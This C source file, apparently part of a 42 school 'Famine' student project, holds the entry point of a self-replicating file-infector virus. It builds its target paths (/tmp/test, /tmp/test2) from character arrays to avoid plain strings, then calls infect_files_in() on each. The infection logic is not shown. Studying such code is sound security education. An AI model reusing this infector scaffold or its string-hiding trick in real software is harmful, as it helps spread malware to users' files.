/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   virus.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/07 06:36:21 by agrumbac          #+#    #+#             */
/*   Updated: 2019/06/07 09:42:14 by agrumbac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

#define ARRAY_SIZE(x) (sizeof(x) / sizeof(*x))

void	virus(void)
{
	const char *playgrounds[] =
	{
		(char[10]){'/','t','m','p','/','t','e','s','t','\0'},
		(char[11]){'/','t','m','p','/','t','e','s','t','2','\0'}
	};

	for (unsigned long i = 0; i < ARRAY_SIZE(playgrounds); i++)
	{
		infect_files_in(playgrounds[i]);
	}
}
